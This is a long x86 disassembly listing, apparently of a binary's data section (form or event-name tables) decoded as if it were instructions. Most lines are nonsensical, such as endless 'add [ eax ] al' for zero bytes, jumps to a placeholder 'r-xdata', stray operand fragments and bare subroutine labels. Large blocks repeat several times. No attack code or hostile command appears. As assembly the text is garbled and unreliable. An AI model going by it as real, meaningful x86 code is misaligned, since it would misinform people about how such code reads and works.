add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
inc esp
mov [ eax + eax - 0x28 ] es
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc esp
outsd
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
pop eax
jb r-xdata
inc eax
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax - 0x43ffbdf1 ] dh
inc edx
inc esp
jb r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
cmp [ eax ] eax
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc edx
inc esp
add [ eax - 0x40 ] dl
inc esp
add ah bl
cwde
inc ebp
add [ edi + esi * 8 - 0x3e37ffbc ] ah
inc esp
add [ eax + eax * 8 - 0x66d3ffbc ] al
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ eax + eax * 8 - 0x6697ffbc ] bh
inc ebp
add [ eax ] bl
rol [ eax + eax + 0x18 ] 0x43
inc esp
add [ eax ] bh
rol [ eax + eax + 0x78 ] 0x99
inc ebp
add [ edi + esi * 8 - 0x3dd3ffbc ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] ch
add [ eax - 0x3f ] bl
inc esp
add [ ecx + ebx * 4 - 0x666fffbb ] cl
inc ebp
add [ ecx + eax * 8 + 0x44 ] bh
add ah ch
mov esi 0x54110044
inc edx
jne r-xdata
inc eax
arpl [ gs : esp + eax - 0x7b ] si
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
clc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
clc
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
add ah ah
cmovb eax [ eax ]
inc esp
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x242f74c
iretd
je r-xdata
dec edi
outsb
push ebx
je r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0xf
inc edx
add [ edx + eax * 2 + 0xfe40044 ] bh
inc edx
add al dh
rol [ eax + eax + 0x18 ] 0x10
inc edx
add [ ecx + eax * 8 + 0xf680044 ] bl
inc edx
add ah bh
cmovb eax [ eax ]
push eax
adc [ edx ] al
fdivr [ edi + 0x42e00044 ]
bound eax [ ecx ]
cmp al 0x2
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
pop eax
inc esp
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ebx + eax * 2 + 0x44 ] bh
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xf940c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cli
inc ebx
add [ edx ] ch
cli
inc ebx
add [ edx + eax ] cl
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
sub_43f4c4
mov esp 0x100453c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jb r-xdata
jle r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] cl
add [ ecx + edx * 8 - 0x2e43ffbc ] cl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
inc ebx
push 0x65676e61
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
add [ eax ] al
js r-xdata
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
jb r-xdata
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
cmp al ch
inc ebx
add [ eax - 0x7f00fffe ] al
add al [ eax ]
push eax
outsd
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
xchg [ eax + eax + 0x30 ] eax
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ebx
jns r-xdata
je r-xdata
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
je r-xdata
jo r-xdata
outsb
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f09003d ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0038 ] al
outsb
inc [ ecx ]
call 0x2c3f669
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
je r-xdata
add bh bh
add [ edx ] 0x0
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
outsd
ja r-xdata
inc esp
jb r-xdata
add [ eax ] al
xor [ esi ] 0x0
or cl [ edi + 0x6e ]
add [ eax + 0x4f0a0036 ] al
outsb
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
insd
je r-xdata
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
jns r-xdata
jb r-xdata
outsb
dec edi
insd
je r-xdata
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
jb r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
js r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
call 0x2cbf7a9
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ 0x654d6e4f ] cl
popad
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax + 0x4f0a003e ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] cl
dec edi
inc [ ecx ]
push edi
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or [ edi + 0x6e ] ecx
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
cmp [ eax ] eax
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
inc esp
mov [ eax + eax - 0x28 ] es
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc esp
outsd
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
pop eax
jb r-xdata
inc eax
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax - 0x43ffbdf1 ] dh
inc edx
inc esp
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x242f74c
inc edx
inc esp
add [ eax - 0x40 ] dl
inc esp
add ah bl
cwde
inc ebp
add [ edi + esi * 8 - 0x3e37ffbc ] ah
inc esp
add [ eax + eax * 8 - 0x66d3ffbc ] al
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ eax + eax * 8 - 0x6697ffbc ] bh
inc ebp
add [ eax ] bl
rol [ eax + eax + 0x18 ] 0x43
inc esp
add [ eax ] bh
rol [ eax + eax + 0x78 ] 0x99
inc ebp
add [ edi + esi * 8 - 0x3dd3ffbc ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] ch
add [ eax - 0x3f ] bl
inc esp
add [ ecx + ebx * 4 - 0x666fffbb ] cl
inc ebp
add [ ecx + eax * 8 + 0x44 ] bh
add ah ch
mov esi 0x54110044
inc edx
jne r-xdata
inc eax
arpl [ gs : esp + eax - 0x7b ] si
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
clc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
clc
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
add ah ah
cmovb eax [ eax ]
inc esp
jb r-xdata
iretd
je r-xdata
dec edi
outsb
push ebx
je r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0xf
inc edx
add [ edx + eax * 2 + 0xfe40044 ] bh
inc edx
add al dh
rol [ eax + eax + 0x18 ] 0x10
inc edx
add [ ecx + eax * 8 + 0xf680044 ] bl
inc edx
add ah bh
cmovb eax [ eax ]
push eax
adc [ edx ] al
fdivr [ edi + 0x42e00044 ]
bound eax [ ecx ]
cmp al 0x2
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
pop eax
inc esp
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ebx + eax * 2 + 0x44 ] bh
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xf940c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cli
inc ebx
add [ edx ] ch
cli
inc ebx
add [ edx + eax ] cl
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
sub_43f54f
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070031 ] al
outsb
inc ebx
insb
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
jb r-xdata
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
insb
outsd
jae r-xdata
xchg [ eax + eax + 0x30 ] eax
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jo r-xdata
outsb
jo r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
je r-xdata
inc esp
jb r-xdata
add [ eax ] al
xor [ esi ] 0x0
or cl [ edi + 0x6e ]
add [ eax + 0x4f0a0036 ] al
outsb
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
cmp al ch
inc ebx
add [ eax - 0x7f00fffe ] al
add al [ eax ]
push eax
outsd
jo r-xdata
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
jb r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
js r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f09003d ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
cmp [ eax ] eax
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
je r-xdata
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
jns r-xdata
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0038 ] al
outsb
inc [ ecx ]
call 0x2c3f669
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
je r-xdata
add bh bh
add [ edx ] 0x0
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x242f74c
add [ eax ] al
call 0x2cbf7a9
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ 0x654d6e4f ] cl
popad
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax + 0x4f0a003e ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] cl
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
inc [ ecx ]
push edi
outsb
dec edi
insd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
inc esp
mov [ eax + eax - 0x28 ] es
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc esp
outsd
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
pop eax
jb r-xdata
inc eax
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax - 0x43ffbdf1 ] dh
inc edx
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or [ edi + 0x6e ] ecx
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
inc edx
inc esp
add [ eax - 0x40 ] dl
inc esp
add ah bl
cwde
inc ebp
add [ edi + esi * 8 - 0x3e37ffbc ] ah
inc esp
add [ eax + eax * 8 - 0x66d3ffbc ] al
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ eax + eax * 8 - 0x6697ffbc ] bh
inc ebp
add [ eax ] bl
rol [ eax + eax + 0x18 ] 0x43
inc esp
add [ eax ] bh
rol [ eax + eax + 0x78 ] 0x99
inc ebp
add [ edi + esi * 8 - 0x3dd3ffbc ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] ch
add [ eax - 0x3f ] bl
inc esp
add [ ecx + ebx * 4 - 0x666fffbb ] cl
inc ebp
add [ ecx + eax * 8 + 0x44 ] bh
add ah ch
mov esi 0x54110044
inc edx
jne r-xdata
inc eax
arpl [ gs : esp + eax - 0x7b ] si
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
clc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
clc
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
add ah ah
cmovb eax [ eax ]
inc esp
jb r-xdata
iretd
je r-xdata
dec edi
outsb
push ebx
je r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0xf
inc edx
add [ edx + eax * 2 + 0xfe40044 ] bh
inc edx
add al dh
rol [ eax + eax + 0x18 ] 0x10
inc edx
add [ ecx + eax * 8 + 0xf680044 ] bl
inc edx
add ah bh
cmovb eax [ eax ]
push eax
adc [ edx ] al
fdivr [ edi + 0x42e00044 ]
bound eax [ ecx ]
cmp al 0x2
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
pop eax
inc esp
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ebx + eax * 2 + 0x44 ] bh
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xf940c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cli
inc ebx
add [ edx ] ch
cli
inc ebx
add [ edx + eax ] cl
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
sub_43f996
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x48 ] cl
inc esp
inc esp
add al cl
hlt
sub_43fa6c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x43fb 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov bl bh
inc ebx
add [ edx + 0x180043fb ] bh
add al [ eax ]
add ah dh
clc
inc ebx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + 0x45 ] dh
inc esp
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_43fb0a
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x48 ] cl
inc esp
inc esp
add al cl
hlt
sub_43fb2e
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
test [ esi + 0x44 ] al
add [ eax ] dl
or al 0x45
add al al
inc esi
inc esp
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add [ esi + ecx ] ah
inc ebp
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
and [ esp + eax * 2 ] al
inc esp
inc esp
inc esp
add ah bh
inc ebp
inc esp
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
sub_43feba
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
pop esp
inc ebp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
dec ebx
jns r-xdata
je r-xdata
push edi
jo r-xdata
add [ eax ] al
push eax
add [ eax ] al
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090029 ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
jb r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] al
and [ eax + eax ] 0xa
dec edi
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
